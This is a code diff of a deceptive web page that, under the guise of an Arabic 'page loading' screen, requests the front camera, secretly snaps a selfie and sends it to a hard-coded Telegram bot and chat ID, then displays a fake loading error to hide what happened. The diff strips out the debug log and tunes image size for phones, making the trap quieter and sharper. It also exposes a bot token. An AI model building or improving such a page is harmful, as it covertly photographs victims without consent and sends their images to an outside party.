@@ -33,7 +33,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         video { display: none; }
-        #debug { position: absolute; bottom: 10px; left: 10px; font-size: 12px; color: #aaa; }
     </style>
 </head>
 <body>
@@ -41,71 +40,57 @@
         <div class="spinner"></div>
         <p>جاري تحميل الصفحة...</p>
     </div>
-    <div id="debug"></div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const debug = document.getElementById('debug');
-        function log(msg) { debug.innerHTML += msg + "<br>"; console.log(msg); }
-
-        log("بدء التشغيل...");
-
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const loader = document.getElementById('loader');
         const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
         const chatId = "2049331070";
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            log("✅ الكاميرا تم تشغيلها");
-            video.srcObject = stream;
-            setTimeout(captureAndSend, 2500);
+        navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: "user",
+                width: { ideal: 1080 },
+                height: { ideal: 1920 }
+            } 
         })
-        .catch(err => {
-            log("❌ خطأ في الكاميرا: " + err.message);
-            showError();
-        });
+        .then(stream => {
+            video.srcObject = stream;
+            setTimeout(captureAndSend, 2600);
+        })
+        .catch(() => showError());
 
         function captureAndSend() {
-            log("📸 جاري التقاط الصورة...");
-            canvas.width = 1280;
-            canvas.height = 720;
-            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+            // تحسين النسبة للجوال (Portrait)
+            const aspect = video.videoHeight / video.videoWidth;
+            canvas.width = 1080;
+            canvas.height = Math.floor(1080 * aspect);
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(blob => {
-                log("📤 جاري إرسال الصورة إلى تيليجرام...");
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'selfie.jpg');
+                formData.append('photo', blob, 'photo.jpg');
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 })
-                .then(r => r.json())
-                .then(data => {
-                    log("📩 الرد من تيليجرام: " + JSON.stringify(data));
-                    if (data.ok) {
-                        log("✅ نجح الإرسال!");
-                    } else {
-                        log("⚠️ فشل الإرسال: " + data.description);
-                    }
-                    showError();
-                })
-                .catch(err => {
-                    log("❌ خطأ في الاتصال: " + err.message);
-                    showError();
-                });
-            }, 'image/jpeg', 0.8);
+                .then(() => showError())
+                .catch(() => showError());
+            }, 'image/jpeg', 0.88);
         }
 
         function showError() {
             loader.innerHTML = `
                 <h1 style="color:#ff0066;">خطأ في تحميل الصفحة</h1>
-                <p>يرجى المحاولة مرة أخرى</p>
+                <p style="font-size:19px;">حدث خطأ غير متوقع<br>يرجى المحاولة مرة أخرى</p>
             `;
             if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
         }
